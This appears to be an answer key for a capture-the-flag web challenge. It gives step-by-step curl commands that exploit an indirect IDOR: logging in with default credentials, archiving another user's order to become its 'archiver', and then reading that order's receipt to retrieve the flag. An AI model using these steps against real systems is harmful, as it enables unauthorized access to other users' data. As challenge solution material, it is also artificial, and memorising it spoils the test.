# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Indirect IDOR. `/order/<id>/archive` lets any logged-in user make
themselves the `archiver` of ANY order with no ownership check, and the receipt
endpoint authorizes access when `archiver == current_user`. Default creds
`test`/`test`. The flag lives in order `300198` (which you do not own).

1. **Log in** with `test` / `test` (two-step login, one cookie jar):

   ```
   curl -s -c cookies.txt -d "username=test" http://<target>/ -o /dev/null -L
   curl -s -c cookies.txt -b cookies.txt -d "password=test" http://<target>/password/test -o /dev/null -L
   ```

2. **Confirm direct access is blocked.** Requesting the flag order's receipt now
   returns 401, because you are neither its creator nor archiver:

   ```
   curl -s -b cookies.txt http://<target>/order/300198/receipt -w "\nHTTP:%{http_code}\n"
   ```

3. **Abuse the indirect IDOR** — archive the flag order as yourself. This sets
   you as its `archiver` with no ownership check:

   ```
   curl -s -b cookies.txt http://<target>/order/300198/archive -o /dev/null -w "archive HTTP:%{http_code}\n"
   ```

4. **Re-request the receipt.** The authorization check now passes because you are
   the archiver, and the flag is returned:

   ```
   curl -s -b cookies.txt http://<target>/order/300198/receipt
   ```

5. **Extract the flag** (`FLAG{...}`) from the receipt and report it verbatim.
